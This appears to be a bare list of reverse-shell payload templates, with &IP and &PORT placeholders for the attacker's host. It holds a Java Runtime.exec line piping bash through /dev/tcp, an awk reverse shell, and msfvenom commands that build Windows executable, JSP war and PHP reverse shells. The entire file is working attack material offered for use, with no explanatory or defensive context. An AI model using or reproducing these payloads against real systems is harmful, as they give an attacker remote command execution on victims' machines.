payload: Runtime r=Runtime.getRuntime();Process p=r.exec("/bin/bash -c 'exec 5<>/dev/tcp/&IP/&PORT;cat <&5 | while read line; do $line 2>&5 >&5; done'");p.waitFor();

awk 'BEGIN {s = "/inet/tcp/0/&IP/&PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
msfvenom -p windows/x64/shell_reverse_tcp LHOST=&IP LPORT=&PORT -f exe -o shell.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&IP LPORT=&PORT -f war > reverse.war
msfvenom -p php/reverse_php LHOST=&IP LPORT=&PORT -f raw > shell.php
